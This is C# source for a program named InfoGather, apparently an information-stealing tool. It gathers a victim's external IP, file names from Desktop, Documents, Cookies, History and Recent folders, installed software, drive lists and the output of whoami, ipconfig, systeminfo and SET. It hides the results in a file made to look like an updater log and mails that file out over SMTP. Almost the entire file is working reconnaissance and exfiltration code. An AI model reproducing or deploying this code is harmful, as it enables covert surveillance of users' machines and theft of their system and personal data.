using System;
using System.Collections.Generic;
using System.IO;

namespace InfoGather
{
    class Program
    {
        static void Main(string[] args)
        {
            List<string> commands = new List<string> { "whoami", "ipconfig", "systeminfo", "SET" };

            String filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            String desktop = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            string[] logicalDrives = Environment.GetLogicalDrives();

            if (!Directory.Exists(filepath))
            {
                Directory.CreateDirectory(filepath);
            }

            string path = (filepath + @"\localUpdater_new.txt");

            if (!File.Exists(path))
            {
                using StreamWriter sw = File.CreateText(path);
            }

            File.SetAttributes(path, File.GetAttributes(path) | FileAttributes.Hidden);

            using (StreamWriter writer = new StreamWriter(path, true))
            {
                writer.WriteLine("IPV4 ADDRESS: " + LogPublicIP_API.GetExternalIp() + "\n");
                writer.WriteLine("ALL DESKTOP FILES: ");

                foreach (var pathex in Directory.GetFiles(desktop))
                {
                    writer.WriteLine(System.IO.Path.GetFileName(pathex));
                }

                writer.WriteLine("\nALL DOCUMENTS FILES: ");

                foreach (var pathex in Directory.GetFiles(filepath))
                {
                    writer.WriteLine(System.IO.Path.GetFileName(pathex));
                }

                writer.WriteLine("\nALL INSTALLED SOFTWARE: ");

                writer.WriteLine(LogInstalledSoftwareClass.LogInstalledSoftware());

                writer.WriteLine("ALL LOGICAL DRIVES: ");

                foreach (var drive in logicalDrives)
                {
                    writer.WriteLine("LOGICAL DRIVE: " + drive);
                }


                //SOME FILES & SUBDIRECTORIES
                List<string> exx = new List<string> 
                {
                    Environment.GetFolderPath(Environment.SpecialFolder.Cookies),
                    Environment.GetFolderPath(Environment.SpecialFolder.MyVideos),
                    Environment.GetFolderPath(Environment.SpecialFolder.Favorites),
                    Environment.GetFolderPath(Environment.SpecialFolder.History),
                    Environment.GetFolderPath(Environment.SpecialFolder.Recent),
                    Environment.GetFolderPath(Environment.SpecialFolder.NetworkShortcuts) 
                };

                foreach (string namex in exx) 
                {
                    writer.WriteLine("\nALL " + namex + " FILES: ");

                    foreach (var pathex in Directory.GetFiles(namex))
                    {
                        writer.WriteLine(System.IO.Path.GetFileName(pathex));
                    }

                    writer.WriteLine("\n" + LogSubDirectories.GetSubDirectories(namex));
                }

            }

            /// <summary>
            /// Calls upon CommandExecutor class and executes a MSDOS Command
            /// </summary>
            foreach (string commande in commands)
            {
                string output = CommandExecutor.ExecuteCommandSync(commande);

                using StreamWriter writer = new StreamWriter(path, true);
                writer.WriteLine(output);
            }

            /// <summary>
            /// SMTP Mailserver sends .txt to emailaddress
            /// </summary>
            SMTP.SendNewMessage();

        }

    }

}
